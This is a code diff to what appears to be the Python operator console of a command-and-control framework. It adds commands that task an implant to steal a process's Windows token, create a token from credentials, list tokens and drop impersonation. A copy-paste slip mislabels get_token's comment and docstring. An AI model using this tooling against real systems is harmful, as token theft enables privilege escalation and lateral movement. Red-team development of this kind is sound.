@@ -226,14 +226,35 @@ class CSharp(CommandSet):
             return
         post_job(f'"name":"ps","arguments":"","type":1')
 
+    """ 
+    Rev2Self Command 
+    """
+
+    def do_rev2self(self, _: cmd2.Statement):
+        """ Drops all impersonated tokens. """
+        if not connect.client.current_connection:
+            print('Please select a connection with \'*<connection_id>\'')
+            return
+        post_job(f'"name":"rev2self","arguments":"","type":1')
+
+    """ 
+    Rev2Self Command 
+    """
+
+    def do_get_token(self, _: cmd2.Statement):
+        """ Drops all impersonated tokens. """
+        if not connect.client.current_connection:
+            print('Please select a connection with \'*<connection_id>\'')
+            return
+        post_job(f'"name":"get_token","arguments":"","type":1')
 
     """ 
     MakeToken Command 
     """
 
     make_token_parser = cmd2.Cmd2ArgumentParser()
-    make_token_parser.add_argument('username', help='User to impersonate')
     make_token_parser.add_argument('domain', help='The domain to impersonate for')
+    make_token_parser.add_argument('username', help='User to impersonate')
     make_token_parser.add_argument('password', help='The password of the user')
 
     @with_argparser(make_token_parser)
@@ -242,9 +263,29 @@ class CSharp(CommandSet):
         if not connect.client.current_connection:
             print('Please select a connection with \'*<connection_id>\'')
             return
-        args = [ns.username, ns.domain, ns.password]
-        arg_bytes = base64.b64encode(','.join(args).encode())
+        domain_bytes = base64.b64encode(ns.domain.encode())
+        domain_str = str(domain_bytes, 'utf-8')
+        user_bytes = base64.b64encode(ns.username.encode())
+        user_str = str(user_bytes, 'utf-8')
+        password_bytes = base64.b64encode(ns.password.encode())
+        password_str = str(password_bytes, 'utf-8')
+        post_job(f'"name":"make_token","arguments":"{domain_str},{user_str},{password_str}","type":1')
+
+    """ 
+    StealToken Command 
+    """
+
+    steal_token_parser = cmd2.Cmd2ArgumentParser()
+    steal_token_parser.add_argument('pid', help='The pid of the process to impersonate.')
+
+    @with_argparser(steal_token_parser)
+    def do_steal_token(self, ns: argparse.Namespace):
+        """ Impersonate a processes token. """
+        if not connect.client.current_connection:
+            print('Please select a connection with \'*<connection_id>\'')
+            return
+        arg_bytes = base64.b64encode(ns.pid.encode())
         arg_str = str(arg_bytes, 'utf-8')
-        post_job(f'"name":"make_token","arguments":"{arg_str}","type":1')
+        post_job(f'"name":"steal_token","arguments":"{arg_str}","type":1')
 
 
